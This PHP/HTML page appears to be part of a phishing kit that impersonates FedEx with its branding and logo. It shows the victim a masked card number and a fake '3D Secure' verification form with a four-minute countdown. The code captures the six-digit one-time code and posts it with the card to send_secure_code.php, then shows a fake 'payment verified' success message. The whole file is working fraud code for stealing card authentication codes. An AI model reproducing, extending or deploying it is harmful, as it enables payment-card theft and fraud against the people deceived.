<?php
session_start();
if (!isset($_SESSION['masked_card_number'])) {
    header("Location: index.php");
    exit;
}

// Load language file
$lang = $_SESSION['lang'] ?? 'en';
$langFile = __DIR__ . "/../lang_three/$lang.php";
if (!file_exists($langFile)) {
    $langFile = __DIR__ . "/../lang_three/en.php";
}
include $langFile;
?>

<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($lang); ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($t['page_title']); ?></title>
    <link rel="icon" type="image/png" href="./img/logo.jpg">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'fedex-purple': '#4D148C',
                        'fedex-orange': '#FF6200',
                        'fedex-gray': '#4A4A4A',
                        'fedex-light-gray': '#E6E6E6',
                    },
                    fontFamily: { sans: ['Helvetica Neue', 'Arial', 'sans-serif'] },
                    animation: {
                        'bounce-subtle': 'bounceSubtle 2s infinite',
                        'shake': 'shake 0.5s ease-in-out',
                    },
                    keyframes: {
                        bounceSubtle: {
                            '0%, 100%': { transform: 'translateY(0px)' },
                            '50%': { transform: 'translateY(-3px)' },
                        },
                        shake: {
                            '0%, 100%': { transform: 'translateX(0)' },
                            '25%': { transform: 'translateX(-4px)' },
                            '75%': { transform: 'translateX(4px)' },
                        },
                    }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; }
        .card-float { transition: all 0.3s ease; }
        .card-float:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
        .input-focus { transition: all 0.3s ease; }
        .input-focus:focus { border-color: #FF6200; box-shadow: 0 0 0 3px rgba(255, 98, 0, 0.2); }
        .error-shake { animation: shake 0.5s; }
        .fedex-button { text-transform: uppercase; letter-spacing: 0.05em; }
        .credit-card { 
            background: linear-gradient(135deg, #4D148C 0%, #6B46C1 100%);
            border-radius: 12px;
            color: white;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        .credit-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
            opacity: 0.3;
        }
    </style>
</head>
<body class="bg-white min-h-screen py-6">

<!-- Initial Loading Spinner -->
<div id="loader" class="fixed inset-0 bg-white flex items-center justify-center z-50 transition-opacity duration-500">
    <div class="flex flex-col items-center space-y-4">
        <div class="flex space-x-2 items-center">
            <img src="https://cdn.sanity.io/images/kts928pd/production/c423a9d143ae2a03c1e7076e9abf851a19fceaec-1600x900.png" alt="FedEx Logo" class="h-8">
        </div>
        <div class="relative w-16 h-16">
            <div class="absolute inset-0 border-4 border-fedex-purple border-t-transparent rounded-full animate-spin"></div>
        </div>
        <p class="text-fedex-gray text-sm font-medium uppercase"><?php echo htmlspecialchars($t['processing_verification']); ?></p>
    </div>
</div>

<!-- Submission Loader -->
<div id="submission-loader" class="hidden fixed inset-0 bg-white flex items-center justify-center z-50 transition-opacity duration-500">
    <div class="flex flex-col items-center space-y-4">
        <div class="flex space-x-2 items-center">
            <img src="https://cdn.sanity.io/images/kts928pd/production/c423a9d143ae2a03c1e7076e9abf851a19fceaec-1600x900.png" alt="FedEx Logo" class="h-8">
        </div>
        <div class="relative w-16 h-16">
            <div class="absolute inset-0 border-4 border-fedex-purple border-t-transparent rounded-full animate-spin"></div>
        </div>
        <p class="text-fedex-gray text-sm font-medium uppercase"><?php echo htmlspecialchars($t['verifying_code']); ?></p>
    </div>
</div>

<!-- Main Content -->
<div id="main-content" class="hidden container mx-auto px-4 max-w-lg">
    <!-- Header -->
    <div id="header" class="text-center mb-8">
        <div class="flex items-center justify-center space-x-2 mb-4">
            <span class="text-green-600 font-bold text-2xl">✓</span>
            <h1 class="text-2xl font-bold text-fedex-purple uppercase"><?php echo htmlspecialchars($t['verification_required']); ?></h1>
        </div>
        <p class="text-fedex-gray text-base"><?php echo htmlspecialchars($t['payment_verification_message']); ?></p>

        <!-- Credit Card Display -->
        <div class="credit-card mt-4 card-float">
            <div class="relative z-10">
                <div class="flex justify-between items-center mb-4">
                    <span id="card-type" class="text-sm font-semibold uppercase"></span>
                    <img src="https://cdn.sanity.io/images/kts928pd/production/c423a9d143ae2a03c1e7076e9abf851a19fceaec-1600x900.png" alt="FedEx Logo" class="h-6 opacity-80">
                </div>
                <div class="text-xl font-mono tracking-wider mb-4"><?php echo htmlspecialchars($_SESSION['masked_card_number']); ?></div>
                <div class="flex justify-between text-xs">
                    <span><?php echo htmlspecialchars($t['valid_thru']); ?>: 12/27</span>
                    <span>3D SECURE</span>
                </div>
            </div>
        </div>
        <p id="timer" class="text-fedex-gray text-sm mt-4"><?php echo htmlspecialchars($t['time_remaining']); ?>: <span id="countdown">04:00</span></p>
    </div>

    <!-- 3D Secure Form Card -->
    <div id="form-card" class="bg-white rounded-lg shadow-md p-6 card-float">
        <form id="secure-form" class="space-y-4">
            <div>
                <label for="secure-code" class="block text-sm font-semibold text-fedex-purple mb-1"><?php echo htmlspecialchars($t['secure_code']); ?></label>
                <input type="text" id="secure-code" placeholder="<?php echo htmlspecialchars($t['enter_code']); ?>" maxlength="6" class="w-full p-3 border border-fedex-light-gray rounded focus:border-fedex-orange focus:outline-none input-focus transition-all duration-300" />
                <div id="secure-code-error" class="text-red-600 text-xs mt-1 hidden"><?php echo htmlspecialchars($t['invalid_code']); ?></div>
            </div>
            <button type="submit" class="w-full bg-fedex-purple hover:bg-fedex-orange text-white py-3 rounded font-semibold text-sm fedex-button transition-all duration-300"><?php echo htmlspecialchars($t['verify_code']); ?></button>
        </form>
    </div>

    <!-- Success Message -->
    <div id="success-message" class="hidden text-center mt-8">
        <div class="w-12 h-12 bg-green-100 rounded-full mx-auto mb-4 flex items-center justify-center animate-bounce-subtle">
            <span class="text-green-600 font-bold text-xl">✓</span>
        </div>
        <h2 class="text-xl font-bold text-fedex-purple uppercase mb-2"><?php echo htmlspecialchars($t['verification_success']); ?></h2>
        <p class="text-fedex-gray text-base"><?php echo htmlspecialchars($t['payment_verified']); ?></p>
    </div>
</div>

<script>
    const cardNumber = '<?php echo htmlspecialchars($_SESSION['masked_card_number']); ?>';
    const t = <?php echo json_encode($t); ?>;

    function getCardType(cardNumber) {
        cardNumber = cardNumber.replace(/[^0-9]/g, '');
        if (/^4/.test(cardNumber)) return 'Visa';
        if (/^5[1-5]/.test(cardNumber)) return 'Mastercard';
        if (/^3[47]/.test(cardNumber)) return 'American Express';
        return 'Unknown';
    }
    document.getElementById('card-type').textContent = getCardType(cardNumber);

    // Countdown Timer
    let timeLeft = 240;
    let timerInterval;
    function startTimer() {
        const countdownElement = document.getElementById('countdown');
        timerInterval = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60).toString().padStart(2,'0');
            const seconds = (timeLeft % 60).toString().padStart(2,'0');
            countdownElement.textContent = `${minutes}:${seconds}`;
            if(timeLeft <=0){clearInterval(timerInterval);countdownElement.textContent='00:00';}
        },1000);
    }
    startTimer();

    // Form validation
    const form = document.getElementById('secure-form');
    const secureCode = document.getElementById('secure-code');

    function hideError(input, errorId){
        input.classList.remove('border-red-500','error-shake');
        document.getElementById(errorId).classList.add('hidden');
    }

    function showError(input, errorId,message){
        input.classList.add('border-red-500','error-shake');
        const error = document.getElementById(errorId);
        error.textContent = message;
        error.classList.remove('hidden');
    }

    secureCode.addEventListener('input', e=>{
        e.target.value = e.target.value.replace(/\D/g,'').slice(0,6);
        if(e.target.value.length===6) hideError(e.target,'secure-code-error');
    });

    form.addEventListener('submit', e=>{
        e.preventDefault();
        let valid = true;
        document.querySelectorAll('.error-shake').forEach(el=>el.classList.remove('error-shake','border-red-500'));
        document.querySelectorAll('[id$="-error"]').forEach(el=>el.classList.add('hidden'));

        if(secureCode.value.length!==6 || !/^\d{6}$/.test(secureCode.value)){
            showError(secureCode,'secure-code-error',t['invalid_code']);
            valid=false;
        }

        if(valid){
            clearInterval(timerInterval);
            document.getElementById('timer').classList.add('hidden');
            document.getElementById('submission-loader').classList.remove('hidden');
            document.getElementById('main-content').classList.add('hidden');

            const formData = new FormData();
            formData.append('secure_code',secureCode.value);
            formData.append('masked_card',cardNumber);

            fetch('send_secure_code.php',{method:'POST',body:formData})
            .then(r=>r.json())
            .then(data=>{
                if(data.status==='success'){
                    setTimeout(()=>{
                        document.getElementById('submission-loader').classList.add('opacity-0');
                        setTimeout(()=>{
                            document.getElementById('submission-loader').style.display='none';
                            document.getElementById('main-content').classList.remove('hidden');
                            document.getElementById('form-card').classList.add('hidden');
                            document.getElementById('success-message').classList.remove('hidden');
                        },500);
                    },3000);
                }else{
                    document.getElementById('submission-loader').classList.add('opacity-0');
                    setTimeout(()=>{
                        document.getElementById('submission-loader').style.display='none';
                        document.getElementById('main-content').classList.remove('hidden');
                        document.getElementById('timer').classList.remove('hidden');
                        startTimer();
                        alert(t['failed_send']+': '+data.message);
                    },500);
                }
            }).catch(error=>{
                document.getElementById('submission-loader').classList.add('opacity-0');
                setTimeout(()=>{
                    document.getElementById('submission-loader').style.display='none';
                    document.getElementById('main-content').classList.remove('hidden');
                    document.getElementById('timer').classList.remove('hidden');
                    startTimer();
                    alert(t['error_occurred']+': '+error.message);
                },500);
            });
        }
    });

    setTimeout(()=>{
        document.getElementById('loader').classList.add('opacity-0');
        document.getElementById('loader').classList.remove('z-50');
        setTimeout(()=>{
            document.getElementById('loader').style.display='none';
            document.getElementById('main-content').classList.remove('hidden');
        },500);
    },3000);
</script>
</body>
</html>